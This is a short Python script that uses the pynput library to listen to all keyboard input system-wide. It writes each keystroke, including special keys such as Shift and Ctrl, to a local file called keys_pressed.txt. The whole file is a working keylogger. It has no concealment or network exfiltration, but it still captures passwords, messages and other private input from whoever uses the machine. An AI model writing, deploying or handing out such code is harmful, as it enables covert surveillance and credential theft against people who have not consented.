from pynput import keyboard

# Function to manage key press
def on_press(key):
    try:
        # Type the pressed key in the file
        with open('keys_pressed.txt', 'a') as f:
            f.write(f'{key.char}\n')
    except AttributeError:
        # Handles special keys such as Shift, Ctrl, etc.
        with open('keys_pressed.txt', 'a') as f:
            f.write(f'[{key}]\n')

# Configure the key listener
with keyboard.Listener(on_press=on_press) as listener:
    listener.join()
